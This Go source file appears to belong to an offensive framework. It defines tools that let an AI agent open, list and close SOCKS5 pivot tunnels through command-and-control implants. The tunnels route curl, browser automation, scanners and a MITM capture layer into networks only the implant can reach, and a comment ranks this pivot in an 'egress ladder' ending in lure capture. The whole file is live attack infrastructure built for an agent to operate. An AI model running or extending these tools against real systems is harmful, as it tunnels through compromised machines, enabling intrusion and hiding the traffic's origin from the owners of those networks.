package server

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/Autumn-27/behemoth/c2"
	actool "github.com/Autumn-27/norma/tool"
)

// C2 pivot proxy tools. These are the LAST resort of the egress ladder:
//
//	direct fetch → client-side proxy pool → C2 pivot tunnel → lure capture
//
// Use them only when the target is reachable from the implant and not from
// this host: every byte then crosses the beacon channel, so throughput and
// latency are far worse than a normal proxy.

func (s *Server) toolC2ProxyOpen() actool.CoreTool {
	return wrTool("c2_proxy_open",
		"LAST RESORT. Open a loopback SOCKS5 tunnel through a C2 implant so tools (curl, playwright, the MITM capture layer) can reach targets that only the implant can see. Returns socks5://user:pass@127.0.0.1:<port>. Prefer a normal fetch or the proxy pool first: relayed traffic is slow and capped.",
		objSchema(map[string]any{
			"implant_id":      strParam("Implant ID (c2_...) that will egress traffic"),
			"target":          strParam("Primary target host:port the tunnel is opened for (also the default allowlist entry)"),
			"allow":           map[string]any{"type": "array", "items": map[string]any{"type": "string"}, "description": "Extra allowlist entries (host, host:port, host:*). Default: target only — never an open relay"},
			"ttl_minutes":     map[string]any{"type": "integer", "description": "Tunnel lifetime in minutes (default 15, max 240)"},
			"max_mb":          map[string]any{"type": "integer", "description": "Combined up+down byte cap in MB (default 32, max 512)"},
			"auth":            map[string]any{"type": "boolean", "description": "Require SOCKS5 user/pass (default true; only disable for local one-shot tools)"},
			"use_for_capture": map[string]any{"type": "boolean", "description": "Pin this tunnel as the server's effective egress (capture layer, Bash env, MCP, scanners). Outranks an enabled Proxy Pool or Exclusive Tor until c2_proxy_close"},
		}, "implant_id", "target"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			mgr := s.c2Manager()
			if mgr == nil {
				return actool.Errorf("c2 manager unavailable"), nil
			}
			var a struct {
				ImplantID     string   `json:"implant_id"`
				Target        string   `json:"target"`
				Allow         []string `json:"allow"`
				TTLMinutes    int      `json:"ttl_minutes"`
				MaxMB         int      `json:"max_mb"`
				Auth          *bool    `json:"auth"`
				UseForCapture bool     `json:"use_for_capture"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(fmt.Sprintf("invalid input JSON: %v", err)), nil
			}
			if _, ok := mgr.Get(a.ImplantID); !ok {
				return actool.Errorf("unknown implant: " + a.ImplantID), nil
			}
			auth := true
			if a.Auth != nil {
				auth = *a.Auth
			}
			tun, err := mgr.TunnelMgr().OpenTunnel(c2.TunnelOpts{
				ImplantID:  a.ImplantID,
				Target:     a.Target,
				Allow:      a.Allow,
				TTLMinutes: a.TTLMinutes,
				MaxMB:      a.MaxMB,
				Auth:       auth,
			})
			if err != nil {
				return actool.Errorf(fmt.Sprintf("open tunnel: %v", err)), nil
			}
			proxy := tunnelProxy(tun)
			out := map[string]any{
				"tunnel_id":  tun.ID,
				"proxy":      proxy,
				"target":     tun.Target,
				"allow":      tun.Allow,
				"expires_in": tun.TTL.String(),
				"implant_id": tun.ImplantID,
				"hint":       "Point tools at this proxy (curl -x, HTTP_PROXY, playwright proxy) or poll c2_proxy_list. Close with c2_proxy_close when done.",
			}
			if a.UseForCapture && s.m != nil {
				// Pin it as the effective egress override: a plain global-proxy
				// write is a silent no-op while the Proxy Pool owns routing.
				if err := s.m.SetCaptureEgressOverride(proxy); err != nil {
					out["capture_error"] = err.Error()
				} else {
					out["capture"] = "server egress (capture layer, bash env, MCP) now exits through this tunnel; it overrides Proxy Pool / Tor until c2_proxy_close"
				}
			}
			return jsonResult(out)
		})
}

// tunnelProxy renders the socks URL including credentials when set.
func tunnelProxy(t *c2.Tunnel) string {
	if t.Pass != "" {
		return "socks5://" + t.User + ":" + t.Pass + "@" + t.Addr
	}
	return "socks5://" + t.Addr
}

func (s *Server) toolC2ProxyClose() actool.CoreTool {
	return wrTool("c2_proxy_close",
		"Close a C2 pivot tunnel (or every tunnel of one implant) and, by default, restore direct egress for the capture layer.",
		objSchema(map[string]any{
			"tunnel_id":     strParam("Tunnel ID from c2_proxy_open / c2_proxy_list"),
			"implant_id":    strParam("Close every tunnel of this implant instead of a single tunnel"),
			"clear_capture": map[string]any{"type": "boolean", "description": "Also clear the global egress proxy when it points at the closed tunnel (default true)"},
		}),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			mgr := s.c2Manager()
			if mgr == nil {
				return actool.Errorf("c2 manager unavailable"), nil
			}
			var a struct {
				TunnelID     string `json:"tunnel_id"`
				ImplantID    string `json:"implant_id"`
				ClearCapture *bool  `json:"clear_capture"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(fmt.Sprintf("invalid input JSON: %v", err)), nil
			}
			if strings.TrimSpace(a.TunnelID) == "" && strings.TrimSpace(a.ImplantID) == "" {
				return actool.Errorf("tunnel_id or implant_id is required"), nil
			}
			proxies := make([]string, 0, 1)
			closed := 0
			if id := strings.TrimSpace(a.TunnelID); id != "" {
				if info, ok := mgr.TunnelMgr().GetTunnel(id); ok {
					proxies = append(proxies, info.Proxy)
				}
				if mgr.TunnelMgr().CloseTunnel(id) {
					closed = 1
				}
			} else {
				for _, info := range mgr.TunnelMgr().ListTunnels() {
					if info.ImplantID == a.ImplantID {
						proxies = append(proxies, info.Proxy)
					}
				}
				closed = mgr.TunnelMgr().CloseImplantTunnels(a.ImplantID)
			}
			out := map[string]any{"closed": closed}
			clear := true
			if a.ClearCapture != nil {
				clear = *a.ClearCapture
			}
			if clear && s.m != nil {
				override := s.m.CaptureEgressOverride()
				for _, proxy := range proxies {
					if override != "" && override == proxy {
						if err := s.m.SetCaptureEgressOverride(""); err != nil {
							out["capture_error"] = err.Error()
						} else {
							out["capture"] = "egress override cleared; the Proxy Pool / Tor / direct route is effective again"
						}
						break
					}
				}
			}
			return jsonResult(out)
		})
}

func (s *Server) toolC2ProxyList() actool.CoreTool {
	return roTool("c2_proxy_list",
		"List live C2 pivot tunnels with proxy URL, byte usage, open connection count and expiry.",
		objSchema(map[string]any{
			"implant_id": strParam("Filter by implant ID (optional)"),
		}),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			mgr := s.c2Manager()
			if mgr == nil {
				return actool.Errorf("c2 manager unavailable"), nil
			}
			var a struct {
				ImplantID string `json:"implant_id"`
			}
			_ = json.Unmarshal(in, &a)
			out := []c2.TunnelInfo{}
			for _, t := range mgr.TunnelMgr().ListTunnels() {
				if a.ImplantID == "" || t.ImplantID == a.ImplantID {
					out = append(out, t)
				}
			}
			global := ""
			if s.m != nil {
				global = s.m.GlobalProxy()
			}
			return jsonResult(map[string]any{"count": len(out), "tunnels": out, "global_proxy": global})
		})
}
